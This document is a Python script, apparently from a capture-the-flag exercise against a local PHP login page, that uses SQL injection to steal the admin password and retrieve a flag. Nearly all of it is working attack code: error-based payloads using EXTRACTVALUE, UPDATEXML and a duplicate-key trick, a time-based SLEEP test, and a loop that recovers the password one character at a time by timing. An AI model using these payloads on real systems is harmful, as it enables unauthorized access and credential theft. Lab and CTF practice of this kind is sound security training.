import requests
import re

target = "http://127.0.0.1:32895/index.php"

print("[NEW STRATEGY] Maybe we need to extract the ACTUAL admin password\n")
print("If the backend does: fetch user, check password, check is_admin")
print("Then UNION might not work because it bypasses the normal flow\n")

# Try to use error-based SQL injection to leak data
print("="*80)
print("[ERROR-BASED SQL INJECTION]")
print("="*80)

error_payloads = [
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')))-- -",
    "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')), 1)-- -",
    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
]

for payload in error_payloads:
    params = {'username': payload, 'password': 'x'}
    resp = requests.get(target, params=params)
    
    print(f"\nPayload: {payload[:80]}...")
    print(f"Length: {len(resp.text)}")
    
    # Look for error messages
    if 'error' in resp.text.lower() or 'warning' in resp.text.lower():
        print(f"[!] Error message found:")
        print(resp.text[:1000])
    
    # Check if different from baseline
    if len(resp.text) != 3173:
        print(f"[!] DIFFERENT LENGTH!")
        print(resp.text[:1000])
    
    if 'FLAG{' in resp.text:
        flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
        print(f"[!!! FLAG FOUND !!!]: {flag_match.group(0)}")
        exit(0)

# Try time-based blind SQL injection to confirm injection works
print("\n" + "="*80)
print("[TIME-BASED BLIND SQL INJECTION TEST]")
print("="*80)

import time

time_payloads = [
    ("admin' AND SLEEP(0)-- -", "Should be instant"),
    ("admin' AND SLEEP(3)-- -", "Should take 3+ seconds"),
]

for payload, expected in time_payloads:
    params = {'username': payload, 'password': 'x'}
    start = time.time()
    resp = requests.get(target, params=params)
    elapsed = time.time() - start
    
    print(f"{expected:25s} | {payload:35s} | Time: {elapsed:.2f}s")

# Maybe we need to actually extract the password character by character
print("\n" + "="*80)
print("[EXTRACT ADMIN PASSWORD - First 3 characters]")
print("="*80)

# Let's try to extract first few characters of admin password
password_chars = ""

for position in range(1, 4):  # First 3 characters
    found = False
    for char_code in range(32, 127):  # Printable ASCII
        char = chr(char_code)
        # Boolean-based blind: if correct char, delay happens
        payload = f"admin' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}',SLEEP(0.5),0)-- -"
        
        params = {'username': payload, 'password': 'x'}
        start = time.time()
        resp = requests.get(target, params=params, timeout=2)
        elapsed = time.time() - start
        
        if elapsed > 0.4:  # If it delayed, we found the char
            password_chars += char
            print(f"[+] Position {position}: '{char}' (delay: {elapsed:.2f}s)")
            print(f"    Password so far: {password_chars}")
            found = True
            break
    
    if not found:
        print(f"[✗] Could not find character at position {position}")
        break

if password_chars:
    print(f"\n[*] Extracted password prefix: {password_chars}")
    print(f"[*] Trying to login with admin:{password_chars}")
    
    params = {'username': 'admin', 'password': password_chars}
    resp = requests.get(target, params=params)
    
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    
    if flag_match:
        print(f"[!!! FLAG FOUND !!!]: {flag_match.group(0)}")
        print(resp.text)
        exit(0)
    else:
        print(f"[✗] No flag yet, need more characters")

print("\n[COMPLETE] Extraction attempt finished")

